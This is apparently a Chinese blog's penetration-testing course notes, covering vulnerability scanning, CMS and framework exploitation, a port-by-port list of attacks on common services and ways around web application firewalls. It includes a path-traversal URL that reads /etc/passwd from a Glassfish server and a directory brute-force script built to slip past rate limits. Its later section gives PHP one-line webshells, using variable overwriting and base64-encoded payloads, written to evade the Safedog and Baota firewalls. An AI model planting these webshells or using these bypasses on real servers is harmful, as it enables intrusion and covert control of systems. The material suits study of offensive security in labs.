通常CVSS与CVE一同由每个国家漏洞库（NVD）发布并保持数据的更新<br>
分值范围：0-10<br>
不同机构按CVSS分值定义威胁的中、高、低威胁级别<br>
CVSS体现弱点的风险，威胁级别（severity）表现弱点风险对企业的影响程度<br>
CVSS分值是工业标准，但威胁级别不是<br>
CVE（Common Vulnerabilities &amp; Exposures，即“通用漏洞披露”）</p>
<p>已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
MITRE公司负责维护（非盈利机构）<br>
扫描器的大部分扫描项都对应一个CVE编号<br>
实现不同厂商之间信息交换的统一标准<br>
CVE发布流程<br>
发现漏洞<br>
CAN负责指定CVE ID<br>
发布到CVE List——CVE-2008-4250<br>
exp:利用</p>
<p>poc:验证</p>
<p>漏洞发现-操作系统之漏洞探针类型利用修复</p>
<p>1.角色扮演：操作系统权限的获取会造成服务器上安全问题</p>
<p>2.漏扫工具：Goby，Nmap，Nessus，Openvas，Nexpose等，举例</p>
<p>Goby 忍者系统测试<br>
nmap 默认nse插件（扫描常规漏洞）：<br>
nmap --script=vuln 192.168.33.1<br>
nmap 扩展漏洞扫描模块（参考：https://www.cnblogs.com/shwang/p/12623669.html）<br>
nmap -sV --script=vulscan/vulscan.nse 192.168.199.1<br>
nmap -sV --script=nmap-vulners 192.168.199.1<br>
Nessus 安装-使用-插件库加载扫描（推荐此工具）<br>
下载：https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA 提取码：cxd4<br>
3.漏洞类型：权限提升，缓冲器溢出，远程代码执行，未知Bug等</p>
<p>4.漏洞利用：工具框架集成类，漏洞公布平台库类，复现文章参考等</p>
<p>使用工具框架，包括：metasploit、searchsploit、企业单位内部产品等<br>
kali系统<br>
忍者安全渗透系统（NINJUTSU OS)：https://blog.csdn.net/qq_35258210/article/details/115457883<br>
searchsploit使用攻略：https://www.jianshu.com/p/bd8213c53717<br>
搜索漏洞公布平台，寻找单点EXP<br>
https://www.cnvd.org.cn/<br>
https://www.seebug.org/<br>
https://fr.0day.today/<br>
https://www.exploit-db.com/<br>
https://packetstormsecurity.com/<br>
5.漏洞修复：打上漏洞补丁，关闭对应入口点，加上防护软件硬件等</p>
<h1 id="43漏洞发现-web应用之漏洞探针类型利用修复">43：漏洞发现-WEB应用之漏洞探针类型利用修复</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635846102852.png" alt="" loading="lazy"><br>
已知CMS</p>
<p>如常见的dedecms，discuz，wordpress等源码结构，这种一般采用非框架类开发，但是也有少部分采用框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
<p>搜索漏洞公布平台，寻找单点EXP：</p>
<p>https://www.cnvd.org.cn/<br>
https://www.seebug.org/<br>
https://fr.0day.today/<br>
https://www.exploit-db.com/<br>
https://packetstormsecurity.com/<br>
使用工具框架进行有针对性的扫描：</p>
<p>CMSScan：综合类，一款适用于WordPress、Drupal、Joomla、vBulletin的安全扫描工具<br>
https://github.com/ajinabraham/CMSScan<br>
wpscan：WordPress扫描工具<br>
https://github.com/wpscanteam/wpscan<br>
kali系统，忍者系统自带<br>
使用时需要在官方（https://wpscan.com）申请一个账号（谷歌人机身份验证，必须FQ），登录后得到一个token，使用wpscan时需要带着这个token。</p>
<pre><code>用法：wpscan --url &lt;URL&gt; --api-token &lt;YourToken&gt; 
</code></pre>
<p>joomscan：Joomla扫描工具<br>
https://github.com/OWASP/joomscan<br>
DrupalScan：Drupal扫描工具<br>
https://github.com/rverton/DrupalScan<br>
其他：先识别CMS，然后网上搜索针对该CMS的漏扫工具<br>
代码审计：</p>
<p>函数点挖掘<br>
功能点挖掘<br>
框架类挖掘<br>
开发框架</p>
<p>如常见的thinkphp，spring，flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息（名字，版本），通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
<p>常见的PHP开发框架：Yii、Laravel、Thinkphp<br>
常见的Java开发框架：Shiro、Struts、Spring、Maven<br>
常见的Python开发框架：Flask、Django、Tornado<br>
未知CMS</p>
<p>如常见的企业和个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的程序源码测试思路：能识别二次开发就按已知CMS思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。</p>
<p><strong>案例1：开发框架类源码渗透测试-咨讯-thinkphp</strong></p>
<p>1.fofa搜索&quot;index/login/login&quot;，寻找测试网站。</p>
<p>2.构造错误的url，查看错误回显，确定网站使用thinkphp框架及其版本。</p>
<p>3.使用专门工具对thinkphp进行漏洞挖掘，比如</p>
<p>TPScan（jar文件）：一键ThinkPHP漏洞检测工具（参考：https://www.jeeinn.com/2021/03/1493/）<br>
https://github.com/tangxiaofeng7/TPScan<br>
TPScan（基于Python3）：一键ThinkPHP漏洞检测工具：<br>
https://github.com/Lucifer1993/TPscan<br>
thinkPHP5.x远程命令执行(getshell)测试工具<br>
地址：https://pan.baidu.com/s/17UOif8XD_-V_IMVAHXVlcw 提取码: 31x2<br>
4.找到漏洞后，通过工具框架，漏洞公布平台，复现文章参考等进行漏洞利用。<br>
<strong>案例2：开发框架类源码渗透测试-咨讯-spring</strong></p>
<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
<p>2.在Vulhub网站搜索某类漏洞，按照步骤，启动环境，漏洞复现。如图</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636096377907.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636096386351.png" alt="" loading="lazy"><br>
<strong>案例3：已知CMS非框架类渗透测试-工具脚本-wordpress</strong></p>
<p>1.环境准备：登录墨者学院，启动靶场环境：WordPress插件漏洞分析溯源。<br>
2.CMS识别：进入首页，根据底部版权信息得知，该网站CMS使用的是WordPress。<br>
3.使用wpscan工具扫描。<br>
(1)wpscan官网注册并登录账号，得到token。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636096392240.png" alt="" loading="lazy"></p>
<pre><code>(2)kali下启动扫描：$ wpscan --url http://219.153.49.228:41640/ --api-token &lt;mytoken&gt;
</code></pre>
<p>扫描结果如下：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636096397695.png" alt="" loading="lazy"><br>
4.去网上找到相关文章、poc等，进行漏洞利用。</p>
<p>案例4：已知CMS非框架类渗透测试-代码审计-qqyewu_php<br>
seay源码审计系统<br>
案例5：未知CMS非框架类渗透测试-人工-wg<br>
外挂类网站</p>
<h1 id="44漏洞发现-app应用之漏洞探针类型利用修复">44：漏洞发现-APP应用之漏洞探针类型利用修复</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636194110938.png" alt="" loading="lazy"><br>
思路说明：</p>
<p>反编译提取URL或抓包获取url，进行web应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！</p>
<p><strong>案例1：抓包精灵</strong></p>
<p>Android抓包软件，可以安装到手机上，不需要过多设置，即可抓住手机上app产生的http/https包并自动解析，确定是只能看不能操作。</p>
<p>地址：https://github.com/huolizhuminh/NetWorkPacketCapture/releases/tag/1.0.4</p>
<p><strong>案例2：ApkAnalyser</strong></p>
<p>简介：一键提取安卓应用中可能存在的敏感信息。</p>
<p>用法：将所有app放到程序自动创建的apps目录，再运行主程序就好了，不用加参数。</p>
<p>功能：目前提取了APK内所有字符串、所有URLs、所有ip、可能是hash值的字符串、存在的敏感词（如oss.aliyun）、可能是accessKey的值。</p>
<p>地址：https://github.com/TheKingOfDuck/ApkAnalyser//releases/download/1.0/apkAnalyser.zip</p>
<p><strong>案例3：xray与burp联动被动扫描</strong></p>
<p>参考：https://www.cnblogs.com/L0ading/p/12388928.html</p>
<h1 id="45漏洞发现-api接口服务之漏洞探针类型利用修复">45：漏洞发现-API接口服务之漏洞探针类型利用修复</h1>
<figure data-type="image" tabindex="120"><img src="https://jinqipiaopiao.github.io//post-images/1636194535649.png" alt="" loading="lazy"></figure>
<p>接口服务类安全测试</p>
<p>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小，属于端口服务/第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。</p>
<p>API接口-webservice RESTful APT</p>
<p>https://xz.aliyun.com/t/2412</p>
<p>https://github.com/SmartBear/soapui<br>
根据应用自身的功能方向决定，安全测试目标需有API接口才能进行此类测试，主要涉及的安全问题：自身安全，配合WEB，业务逻辑等，其中产生的危害可大可小，属于应用API接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。</p>
<p>WSDL(网络服务描述语言，web services description language)是一门基于XML的语言，用于描述web services 以及如何对他们进行访问。</p>
<p>漏洞关键字，配合shodan,fofa,zoomye搜索</p>
<pre><code>inurl: jws?wsdl
inurl: asmx?wsdl
inurl: aspx?wsdl
inurl: ascx?wsdl
inurl: ashx?wsdl
inurl: dll?wsdl
inurl: exe?wsdl
inurl: php?wsdl
inurl: pl?wsdl
inurl: ?wsdl
inurl: asmx?wsdl
filetype: ?wsdl
</code></pre>
<p>1.web服务类</p>
<pre><code>tomcat--80/8080/8009
manager弱口令
put上传webshell
HTTP慢速攻击
ajr文件包含漏洞 CVE-2020-1938
Jboss--8080
后台弱口令
console后台部署war包
Java反序列化
远程代码执行
webSphere--9080
后台弱口令
任意文件泄露
Java反序列化
Weblogic--7001/7002
后台弱口令
console后台部署war包
SSRF
测试页面上传webshell
Java反序列化
	CVE-2018-2628
	CVE-2018-2893
	CVE-2017-10271
	CVE-2019-2725
	CVE-2019-2729
Glassfish--8080/4848
暴力破解
任意文件读取
认证绕过
Jetty--8080
远程共享缓冲区溢出
Apache--80/8080
HTTP慢速攻击
解析漏洞
目录遍历
Apache Solr--8983
远程命令执行
　　CVE-2017-12629
　　CVE-2019-0193
IIS--80
put上传webshell
IIS解析漏洞
IIS提权
IIS远程代码执行 CVE-2017-7269
Resin-8080
目录遍历
远程文件读取
Axis2--8080
后台弱口令
Lutos--1352
后台弱口令
信息泄露
跨站脚本攻击
Nginx--80/443
HTTP慢速攻击
解析漏洞
</code></pre>
<p>2.数据库类</p>
<pre><code>MySQL--3306
弱口令
身份认证漏洞 CVE-2012-2122
拒绝服务攻击
phpmyadmin万能密码or弱口令
UDF/MOF提权
Mssql--1433
弱口令
存储过程提权
Oralce--1521
弱口令
TNS漏洞
Redis--6379
弱口令
未授权访问
PostgreSQL--5432
弱口令
缓冲区溢出 CVE-2014-2669
MongoDB--27001
弱口令
未授权访问
DB2--5000
安全限制绕过进行未授权操作 CVE-2015-1922
SysBase--5000/4100
弱口令
命令注入
Memcache-11211
未授权访问
配置漏洞
ElasticSearch--9200/9300
未授权访问
远程代码执行
文件办理
写入Webshell
</code></pre>
<p>3.大数据类</p>
<pre><code>Hadoop--50010
远程命令执行
Zookeeper--2181
未授权访问
</code></pre>
<p>4.文件共享</p>
<pre><code>ftp--21
弱口令
匿名访问
上传后们
远程溢出
漏洞攻击
NFS--2049
未授权访问
Samba--137
弱口令
未授权访问
远程代码执行 CVE-2015-0240
LDAP--389
弱口令
注入
未授权访问
</code></pre>
<p>5.远程访问</p>
<pre><code>SSH--22
弱口令
28退格漏洞
OpenSSL漏洞
用户名枚举
Telnet--23
弱口令
RDP--3389
弱口令
shift粘滞键后门
缓冲区溢出
MS12-020
CVE-2019-0708
WNC--5901
弱口令
认证口令绕过
拒绝服务攻击 CVE-2015-5239
权限提升 CVE-2013-6886
Pcanywhere-5632
拒绝服务攻击
权限提升
代码执行
X11-6000
未授权访问 CVE-1999-0526
</code></pre>
<p>6.邮件服务</p>
<pre><code>SMTP--25/465
弱口令
未授权访问
邮件伪造
POP3-110/995
弱口令
未授权访问
IMAP-143/993
弱口令
任意文件读取
</code></pre>
<p>7.其他服务</p>
<pre><code>DNS--53
DNS区域传输
DNS劫持
DNS欺骗
DNS缓存投毒
DNS隧道
DHCP-67/68
DHCP劫持
DHCP欺骗
SNMP--161
弱口令
Rlogin-512/513/514
rlogin登录
Rsync--873
未授权访问
本地权限提升
Zabbix-8069
远程命令执行
RMI--1090/1099
java反序列化
Docker-2375
未授权访问
</code></pre>
<p><strong>案例1：其他补充类-基于端口web站点又测试</strong></p>
<p>很多网站域名是一个网站，域名+端口又是一个网站，这样当你渗透测试时，相当于多了一个目标，相应的成功几率也会变高。举例：http://yc.zjgsu.edu.cn和http://yc.zjgsu.edu.cn:8080/</p>
<p><strong>案例2：其他补充类-基于域名web站点又测试</strong></p>
<p>思路1：当我们拿到一个域名时，比如www.jmisd.cn，我们可能首先会去查询它的子域名，这是一个方向，这里我们提供另外一种思路，查询它的相关域名，方法是百度 域名查询，会有很多可以查询域名是否已被注册的网站，比如西部数码网站，我们进入后搜索jmisd，会显示以下3个域名已被注册，然后我们分别查看它们的whois信息、下方版权信息等，查看它们与是否与原网站有相同点，若有，说明这两个网站是同一个公司的，然后就为渗透这个网站找到了一条新路。</p>
<p>0<br>
思路2：当我们拿到一个域名时，通过查看它的whois信息、下方版权信息等获取到该网站特有的一些关键信息，然后直接百度搜索这些信息，就有可能得到一些与该网站相关的其他域名。</p>
<p><strong>案例3：其他补充类-基于IP配合端口又测试</strong></p>
<p>思路1：假设xx.com对应目录d:/wwwroot/xx/，192.168.33.2对应目录d:/wwwroot/，此时目录d:/wwwroot/下有一个网站备份压缩包xx.zip，那么访问xx.com/xx.zip不能下载，但是访问192.168.33.2/xx.zip可以成功下载。</p>
<p>思路2：给定一个域名，我们先找到对应的ip，然后扫描IP，可以发现开放的端口，我们进行目录扫描或敏感文件扫描时，不仅需要对域名扫描，还要对IP以及IP:端口进行扫描，这样会发现更多的漏洞。</p>
<p><strong>案例4：端口服务类-Tomcat弱口令安全问题</strong></p>
<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
<p>docker-compose 启动报错时，试试命令：sudo docker-compose up -d</p>
<p>参考：http://wxnacy.com/2019/01/23/docker-compose-up-error/</p>
<p>2.在Vulhub网站搜索tomcat弱口令漏洞洞，按照步骤，启动环境，漏洞复现。如图<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636194555789.png" alt="" loading="lazy"><br>
<strong>案例5：端口服务类-Glassfish任意文件读取</strong></p>
<pre><code>访问https://192.168.28.128:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd，返回服务器文件。
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636194559564.png" alt="" loading="lazy"><br>
<strong>案例6：口令安全脚本工具简要使用-Snetcarcker</strong><br>
Snetcarcker下载：https://github.com/shack2/SNETCracker/releases<br>
SNETCracker超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<br>
工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLServer、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP_SSL、POP3、POP3_SSL、IMAP、IMAP_SSL、SVN、VNC、Redis等服务的弱口令检查工作。<br>
工具特点：<br>
1.支持多种常见服务的口令破解，支持RDP（3389远程桌面）弱口令检查。<br>
2.支持批量导入IP地址或设置IP段，同时进行多个服务的弱口令检查。<br>
3.程序自带端口扫描功能，可以不借助第三方端口扫描工具进行检查。<br>
4.支持自定义检查的口令，自定义端口。<br>
其他工具：hydra</p>
<p><strong>案例7：API接口类-网络服务类探针利用测试-AWVS</strong><br>
测试WSDL网络服务可使用AWVS扫描<br>
awvs下载：https://www.cnblogs.com/xyongsec/p/12370488.html<br>
小技巧：sqlmap指定在参数id处进行注入：使id=1*</p>
<h1 id="2021-11-5-小迪渗透waf绕过">2021-11-5 小迪渗透&amp;Waf绕过</h1>
<h1 id="46信息收集之反爬虫延迟代理技术46-49">46.信息收集之反爬虫延迟代理技术(46-49)</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636093502407.png" alt="" loading="lazy"><br>
<strong>网站部署waf时，采用进程抓包工具抓取webpathbrute数据包分析，一般有2种结果：</strong></p>
<p>1.直接误报或者无结果<br>
2.扫描一段时间后突然误报<br>
扫描探针机制</p>
<p>数据包拦截<br>
速度过快拦截<br>
WebPathBrute-Web路径暴力探测工具：https://github.com/7kbstorm/7kbscan-WebPathBrute</p>
<p>使用WebPathBrute扫描网站目录，当网站服务器分别部署了以下waf时，对拦截机制进行测试分析，结果如下：</p>
<p><strong>1.safedog-默认拦截机制-未开CC</strong></p>
<p>扫描结果：出现误报，全部200状态码<br>
原因：浏览器采用get方法，工具扫描采用head方法。<br>
绕过方法：更改提交方式（改为get方法）或模拟用户<br>
<strong>2.safedog-默认拦截机制-开启CC</strong></p>
<p>扫描结果：误报<br>
绕过方法：延时或代理池或爬虫引擎。<br>
<strong>2.1 延时</strong><br>
可开启延时扫描，慢速扫描，缺点是速度过慢。<br>
<strong>2.2 代理池</strong><br>
网上搜索代理池，写python脚本，添加代理池。确定是WAF可能开启了防代理，无法绕过。<br>
<strong>2.3 爬虫引擎</strong><br>
可在软件中自定义添加爬虫引擎头部（但是扫描不出现结果）<br>
各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
<strong>3.Aliyun_os-默认拦截机制</strong></p>
<p>扫描结果：对部署在阿里云上的网站进行目录扫描时，扫着扫着网站就打不开了，大约1个小时后才能重新打开，重启服务器也不能使网站重新打开，只能等一个小时，猜测这是因为阿里云自己有一套防护体系。<br>
绕过方法：无法模拟搜索引擎爬虫绕过，只能采用延时或代理池<br>
<strong>4.BT（防火墙插件）-默认拦截机制</strong></p>
<p><strong>拦截机制举例：</strong><br>
60秒内，请求同一URL超过120次，封锁IP 100秒。<br>
60秒内，恶意请求6次，封IP 600秒。<br>
什么是恶意请求？比如宝塔检测到用户频繁请求index.php.bak等备份文件，即判断为恶意请求，拦截。对于这种拦截，绕过方法为字典重写（参考于upload-labs做字典）<br>
绕过方法：爬虫未知，延时可以，代理池可以<br>
5.阿里云（免费）+ safedog + 宝塔（付费插件）</p>
<p>绕过方法：延时或代理池<br>
6.python编写绕过脚本，进行目录扫描</p>
<p>自定义headers头部，模拟用户<br>
休眠3秒，模拟延时（测试发现，阿里云至少休眠3秒，否则拦截）<br>
添加proxy，从网上爬取代理池，按需添加，比如一个代理发10个请求，接着换另一个代理。<br>
脚本如下<br>
#搜索引擎爬虫模拟及模拟真实用户</p>
<pre><code>import requests
import time

headers={
'Connection': 'keep-alive',
'Cache-Control': 'max-age=0',
'Upgrade-Insecure-Requests': '1',
#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html
'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)',
'Sec-Fetch-Dest': 'document',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site': 'none',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-User': '?1',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie': 'PHPSESSID=99d6a382f03de62bb8f51ba51e51550f',#根据当前访问 cookie
}

for paths in open('php_b.txt',encoding='utf-8'):
url='http://192.168.0.109:8890/'
paths=paths.replace('\n','')
urls=url+paths
#如需测试加代理，或加入代理池需加代理
proxy = {
'http': '127.0.0.1:7777'
}
try:
code=requests.get(urls,headers=headers,verify=False).status_code
print(urls+'|'+str(code))
if code==200 or code==403:
print(urls+'|'+str(code))
except Exception as err:
print('connecting error')
#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度
</code></pre>
<p>涉及资源<br>
https://www.bt.cn/<br>
http://free.safedog.cn/website_safedog.html<br>
https://www.cnblogs.com/iack/p/3557371.html</p>
<p><strong>47.W漏洞发现之代理池指纹被动探针</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093509448.png" alt="" loading="lazy"><br>
<strong>47.1 漏洞发现触发 WAF 点-针对 xray,awvs 等</strong><br>
1.扫描速度-(代理池，延迟，白名单等)<br>
2.工具指纹-(特征修改，伪造模拟真实用户等)<br>
3.漏洞 Payload-(数据变异，数据加密，白名单等)</p>
<p><strong>47.2 案例演示</strong><br>
代理池 Proxy_pool 项目搭建及使用解释</p>
<p><strong>案例1：代理池Proxy_pool项目搭建及使用解释</strong></p>
<p>Proxy_pool免费，但是不适用于waf绕过，因为它是抓取网上各种代理平台提供的免费代理，免费代理存活时间短，成功率随机，稳定性差。</p>
<p>1.Proxy_pool下载（地址：https://github.com/jhao104/proxy_pool），安装库文件，修改setting.py文件</p>
<pre><code>HOST = &quot;127.0.0.1&quot;

DB_CONN = 'redis://:@127.0.0.1:6379/0'
</code></pre>
<p>2.下载并安装Redis-x64-3.2.100.msi，地址：https://github.com/MicrosoftArchive/redis/releases。</p>
<p>安装完成后，启动服务（找到安装路径，双击redis-cli.exe文件即可，或者在计算机管理-服务 处启动）</p>
<p>3.Redis可视化工具Redis Desktop Manager下载（http://pan.baidu.com/s/1kU8sY3P），安装，连接。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094164164.jpg" alt="" loading="lazy"><br>
4.启动调度程序即可抓到代理，命令：python proxyPool.py schedule<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094168888.jpg" alt="" loading="lazy"></p>
<p>5.启动webApi服务即可通过web api查看代理。</p>
<p>启动命令：python proxyPool.py server</p>
<p>查看：http://127.0.0.1:5010/get/<br>
Redis Desktop Manager中查看<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094175121.png" alt="" loading="lazy"></p>
<p><strong>充钱代理池直接干 safedog+BT+Aliyun 探针</strong></p>
<p>免费代理不好用，那我们就买代理，建议选择隧道代理，每次请求换IP。<br>
快代理：https://www.kuaidaili.com/</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636094179586.jpg" alt="" loading="lazy"><br>
使用上次的脚本，配置收费代理。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094184041.jpg" alt="" loading="lazy"></p>
<p><strong>Safedog-awvs 漏扫注入测试绕过-延时,白名单</strong></p>
<p>使用网站：【http://httpbin.org/ip】检测访问其他网站的原始ip是哪个</p>
<p>awvs扫描sqli-labs（绕过安全狗），设置最低速或者修改AWVS指纹头</p>
<figure data-type="image" tabindex="121"><img src="https://jinqipiaopiao.github.io//post-images/1636094189769.jpg" alt="" loading="lazy"></figure>
<p><strong>Aliyun_os-awvs 漏扫注入测试绕过-延时白名单</strong></p>
<p>注意：不是每个工具都可以控制扫描速度和改变指纹头，比如xray貌似就不行。</p>
<p>此时，可以对工具使用代理，将数据包发送到burpsuite上，人为的对每个数据包点击放行（太麻烦了吧），以控制速度。也可以自己写个鼠标点击器，代替人为点击。</p>
<p>对于漏洞payload触发WAF这种情况，我们怎么绕过呢？</p>
<p>我们举个例子，由于每个工具判断注入点的方式不同，假设awvs通过and 1=1判断注入，xray通过or 1=1判断注入，那么当waf对and 1=1进行拦截时，我们就不能使用awvs来扫描了，因为扫描不出结果，但是我们可以换xray扫描，这样就绕过了waf拦截，所以实际操作时，我们可以多换几个工具进行扫描。（方法1）</p>
<p>此外还可以使用冷门扫描工具，因为工具冷门，所以漏洞验证和指纹都不会被WAF采集到，可以绕过。（方法2）</p>
<p>使用开源的或者自己编写的工具扫描时，可以针对触发WAF点进行数据变异，从而绕过拦截。（方法3）</p>
<p><strong>BT(baota)-awvs+xray 漏扫 Payload 绕过-延时被动</strong></p>
<p>awvs扫描，配置代理，将数据包发送到burp，burp配置代理，将数据包发送给xray，实现三者联动。</p>
<p>此时如果awvs控制了扫描速度，那么xray也会被动延时。</p>
<figure data-type="image" tabindex="122"><img src="https://jinqipiaopiao.github.io//post-images/1636094201396.jpg" alt="" loading="lazy"></figure>
<p><strong>充钱代理池直接干 Safedog+BT+AliyunOS 漏洞发现</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094208016.jpg" alt="" loading="lazy"></p>
<p>涉及资源<br>
http://httpbin.org/<br>
https://www.kuaidaili.com/<br>
https://github.com/jhao104/proxy_pool</p>
<p><strong>48.权限控制之代码混淆及行为造轮子</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093522129.png" alt="" loading="lazy"><br>
<strong>48.1 Safedog&amp;宝塔代码层手写及脚本绕过</strong><br>
变量覆盖，加密混淆，异或生成<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093533648.png" alt="" loading="lazy"></p>
<pre><code>127.0.0.1:8081/1.php?x=b;y=assert post:z=phpinfo 这种传输形式宝塔会拦截
</code></pre>
<figure data-type="image" tabindex="123"><img src="https://jinqipiaopiao.github.io//post-images/1636093528736.png" alt="" loading="lazy"></figure>
<p>在脚本里把接收的参数加密可绕过，把phpinfo()采用base64加密形式传输</p>
<pre><code>&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
#$b($_POST['z']); 宝塔会拦截
$b(base64_decode($_POST['z']));
?&gt;

http://192.168.206.132:8082/`1.php?x=b&amp;y=assert`
#z=phpinfo();
z=cGhwaW5mbygpOw==
//传参：?x=b&amp;y=assert
//$a=b  $$a=assert=$b assert($_POST['z']);

可以绕过safedog查杀

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=phpinfo();

safedog不拦截
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636093544651.png" alt="" loading="lazy"><br>
异或生成<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093553086.png" alt="" loading="lazy"></p>
<p><strong>48.2 BT Aliyun 代码层手写及脚本绕过</strong><br>
编码解码(变量覆盖，加密混淆，异或生成)ASP,PHP,ASPX,JSP,PY 等后门免杀同理</p>
<pre><code>http://test.xiaodi8.com/x.php?id=x
mr6=cGhwaW5mbygpOw==
http://test.xiaodi8.com/xx.php?x=b&amp;y=assert
z=cGhwaW5mbygpOw== 执行代码
z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw== 写入文件
z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs= 读取文件
</code></pre>
<p><strong>48.3 菜刀，蚁剑，冰蝎优缺点</strong><br>
菜刀：未更新状态，无插件，单向加密传输<br>
蚁剑：更新状态，有插件，拓展性强，单向加密传输<br>
冰蝎：更新状态，未知插件，双向加密传输<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093558580.png" alt="" loading="lazy"><br>
演示案例：<br>
<strong>Safedog-手写覆盖变异简易代码绕过-代码层</strong></p>
<pre><code>一句话木马：&lt;?php assert($_POST['chopper']);?&gt;
</code></pre>
<p>变量覆盖：通过把敏感字符写到参数上，绕过WAF：</p>
<pre><code>&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
$b($_POST['z']);
?&gt;

//传参：?x=b&amp;y=assert
//$a=b  $$a=assert=$b assert($_POST['z']);

可以绕过safedog查杀

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=phpinfo();

safedog不拦截
</code></pre>
<p>测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095006090.jpg" alt="" loading="lazy"></p>
<p><strong>Safedog-基于接口类加密混淆代码绕过-代码层</strong><br>
采取上述覆盖变量的方式可以绕过安全狗查杀，但是会被宝塔拦截。原因是 宝塔过滤规则里定义了phpinfo()等关键字<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095010887.png" alt="" loading="lazy"><br>
所以可以配套 使用编码解码方式 绕过 宝塔。</p>
<pre><code>一句话木马：&lt;br&gt;&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
$b(base64_decode($_POST['z']));
?&gt;

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=cGhwaW5mbygpOw==
</code></pre>
<figure data-type="image" tabindex="124"><img src="https://jinqipiaopiao.github.io//post-images/1636095018940.png" alt="" loading="lazy"></figure>
<p><strong>BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong><br>
上传一句话木马：</p>
<pre><code>&lt;?php assert(base64_decode($_POST['chopper']));?&gt;
</code></pre>
<p>木马文件被安全狗查杀<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095025311.png" alt="" loading="lazy"><br>
访问被安全狗拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095029627.png" alt="" loading="lazy"><br>
可以采用加密混淆的方法绕过</p>
<p><strong>方法1：使用enPHP工具加密混淆代码</strong></p>
<pre><code>enPHP：一个开源加密混淆 PHP 代码项目

源码地址：https://github.com/djunny/enphp（工具已被删除）
命令：php.exe code_test.php

在线地址：http://enphp.djunny.com/（貌似也用不了？）
</code></pre>
<p>加密混淆后木马：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095035018.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095040092.png" alt="" loading="lazy"><br>
<strong>方法2：phpjiami在线加密混淆</strong></p>
